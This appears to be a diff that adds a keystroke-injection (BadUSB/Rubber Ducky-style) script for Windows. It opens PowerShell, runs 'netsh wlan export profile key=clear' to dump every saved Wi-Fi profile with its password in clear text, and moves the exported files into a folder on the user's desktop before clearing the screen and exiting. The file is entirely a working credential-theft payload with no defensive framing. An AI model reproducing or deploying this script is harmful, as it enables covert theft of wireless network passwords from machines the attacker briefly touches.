@@ -1,0 +1,19 @@
+DELAY 2
+REM --> Minimize all windows
+Delay 1
+WINDOWS d
+REM --> Open PS
+WINDOWS r
+DELAY 5
+STRING Powershell
+ENTER
+DELAY 7
+REM --> Get all SSID
+STRING netsh wlan export profile key=clear 
+ENTER
+STRING get-childitem -Filter Wi-Fi* -path C:\Users\$env:Username\  | move-item -Destination C:\Users\$env:Username\Desktop\Test
+ENTER
+STRING clear
+ENTER
+STRING exit
+ENTER
